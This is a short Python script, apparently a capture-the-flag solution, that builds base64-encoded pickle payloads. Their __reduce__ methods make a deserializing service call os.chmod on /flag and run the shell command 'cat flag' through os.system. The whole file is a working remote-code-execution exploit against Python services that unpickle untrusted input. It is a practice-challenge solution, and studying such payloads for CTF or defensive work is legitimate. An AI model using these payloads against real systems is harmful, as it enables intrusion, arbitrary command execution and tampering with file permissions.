import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        return (os.chmod, ('/flag', 0o644))

class RCEc:
    def __reduce__(self):
        cmd = ('cat flag')
        return os.system, (cmd,)


pickled = pickle.dumps(RCE(), protocol=2)
print(base64.b64encode(pickled).decode())

pickled = pickle.dumps(RCEc(), protocol=2)
print(base64.b64encode(pickled).decode())